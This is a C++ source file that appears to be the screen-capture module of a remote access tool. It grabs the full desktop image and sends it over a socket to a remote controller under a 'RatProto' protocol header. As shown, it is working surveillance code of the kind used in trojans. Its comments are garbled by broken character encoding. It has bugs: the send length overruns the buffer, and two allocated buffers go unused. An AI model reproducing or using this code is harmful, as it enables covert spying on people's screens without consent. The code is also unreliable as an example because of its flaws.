#include "DeskView.h"


//////////////////////////////////////////////////////////////////////////
//Զ�����沶��
//////////////////////////////////////////////////////////////////////////
BOOL DeskView(SOCKET sockfd)
{
	HBITMAP hBitmap = CapScreen();

	//��Ļ��ʾDC
	HDC hDC = CreateDC("DISPLAY",NULL,NULL,NULL); 
	//��ɫƽ������ɫ��λ�� = ��ǰ�ֱ�����ÿ��������ռ�ֽ���  
	int iBits = GetDeviceCaps(hDC, BITSPIXEL) *GetDeviceCaps(hDC, PLANES);  
	DeleteDC(hDC);

	//λͼ��ÿ��������ռ�ֽ��� 
	WORD   wBitCount;      
	if (iBits <= 1)
		wBitCount = 1;
	else if (iBits <= 4)
		wBitCount = 4;
	else if (iBits <= 8)
		wBitCount = 8;
	else if (iBits <= 24)
		wBitCount = 24;
	else
		wBitCount = iBits;
	//��ɫ���С�� λͼ�������ֽڴ�С
	DWORD   dwPaletteSize=0;	 
	if (wBitCount <= 8)		
		dwPaletteSize = (1 << wBitCount) *	sizeof(RGBQUAD);	
	
	//λͼ���Խṹ
	BITMAP  bm;        
	GetObject(hBitmap, sizeof(bm), (LPSTR)&bm);  

	//λͼ��Ϣͷ�ṹ 
	BITMAPINFOHEADER   bi,bi1;           
	bi.biSize            = sizeof(BITMAPINFOHEADER);  
	bi.biWidth           = bm.bmWidth;
	bi.biHeight          = bm.bmHeight;
	bi.biPlanes          = 1;
	bi.biBitCount        = wBitCount;
	//BI_RGB��ʾλͼû��ѹ��
	bi.biCompression     = BI_RGB; 
	bi.biSizeImage       = 0;
	bi.biXPelsPerMeter   = 0;
	bi.biYPelsPerMeter   = 0;
	bi.biClrUsed         = 0;
	bi.biClrImportant    = 0;
	bi1=bi;
	bi1.biBitCount=24;

	DWORD dwBmBitsSize = ((bm.bmWidth * wBitCount+31)/32) * 4 * bm.bmHeight;    
	//Ϊλͼ���ݷ����ڴ�
	HANDLE hDib  = GlobalAlloc(GHND,dwBmBitsSize + dwPaletteSize + sizeof(BITMAPINFOHEADER));  
	LPBITMAPINFOHEADER lpbi = (LPBITMAPINFOHEADER)GlobalLock(hDib);
	*lpbi = bi;
	// �����ɫ��
	HANDLE hPal = GetStockObject(DEFAULT_PALETTE);   
	HANDLE  hOldPal=NULL; 
	if (hPal)
	{
		hDC = GetDC(NULL);
		hOldPal = SelectPalette(hDC,(HPALETTE)hPal, FALSE);
		RealizePalette(hDC);
	}
	int nOutputBytes = 0;
	unsigned char *pJpp,*m_pDibBits;
	pJpp = new unsigned char [dwBmBitsSize];
	m_pDibBits = new unsigned char [dwBmBitsSize];
	//GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,m_pDibBits,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);
	GetDIBits(hDC, hBitmap, 0, (UINT) bm.bmHeight,(LPSTR)lpbi + sizeof(BITMAPINFOHEADER)+dwPaletteSize,(BITMAPINFO*)lpbi,DIB_RGB_COLORS);// ��ȡ�õ�ɫ�����µ�����ֵ
	//�ָ���ɫ��
	if (hOldPal)
	{
		SelectPalette(hDC, (HPALETTE)hOldPal, TRUE);
		RealizePalette(hDC);
		::ReleaseDC(NULL, hDC);
	}

	//λͼ�ļ�ͷ�ṹ  
	BITMAPFILEHEADER   bmfHdr;    
	// "BM" 
	bmfHdr.bfType = 0x4D42;   
	// ����λͼ�ļ�ͷ
	DWORD dwDIBSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + dwPaletteSize + dwBmBitsSize;  
	bmfHdr.bfSize = dwDIBSize;
	bmfHdr.bfReserved1 = 0;
	bmfHdr.bfReserved2 = 0;
	bmfHdr.bfOffBits = (DWORD)sizeof(BITMAPFILEHEADER) + (DWORD)sizeof(BITMAPINFOHEADER) + dwPaletteSize;

	//HANDLE hFile = CreateFile(strFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL | FILE_FLAG_SEQUENTIAL_SCAN, NULL);//����λͼ�ļ�   
	//DWORD dwWritten;
	//WriteFile(hFile, (LPSTR)&bmfHdr, sizeof(BITMAPFILEHEADER), &dwWritten, NULL);	// д��λͼ�ļ�ͷ
	//WriteFile(hFile, (LPSTR)lpbi, dwDIBSize, &dwWritten, NULL);// д��λͼ�ļ���������

	RatProto ratPro;
	ratPro.RatId = DESK_VIEW;
	ratPro.RatLen = sizeof(BITMAPFILEHEADER)+sizeof(RatProto)+dwDIBSize;
	//����Э��ͷ
	SendCmd(sockfd,(char*)(&ratPro),sizeof(RatProto));
	//����BMPͷ
	SendCmd(sockfd,(char*)(&bmfHdr),sizeof(BITMAPFILEHEADER));
	//����BMP����
	SendCmd(sockfd,(char*)lpbi,dwDIBSize);

	GlobalUnlock(hDib);   //���   
	GlobalFree(hDib);
	//CloseHandle(hFile); 
	delete []pJpp;
	delete []m_pDibBits;

	return TRUE;
}



//////////////////////////////////////////////////////////////////////////
//Capture Screen
//////////////////////////////////////////////////////////////////////////
HBITMAP CapScreen()
{
	//����HWND
	HWND hDesk = GetDesktopWindow();
	//����HDC
	HDC hScreenDC = GetDC(hDesk);
	//CreateCompatibleDC����һ����ʾ������������ڴ��е�DC
	HDC hMemDc = CreateCompatibleDC(hScreenDC);
	RECT stRect;
	GetWindowRect(hDesk,&stRect);
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC,stRect.right-stRect.left,stRect.bottom-stRect.top);
	HGDIOBJ hOldBmp =  SelectObject(hMemDc,hBitmap);
	BitBlt(hMemDc,0,0,stRect.right-stRect.left,stRect.bottom-stRect.top,hScreenDC,stRect.left,stRect.top,SRCCOPY);
	SelectObject(hMemDc,hOldBmp);
	DeleteObject(hMemDc);
	ReleaseDC(hDesk,hScreenDC);

	return hBitmap;
}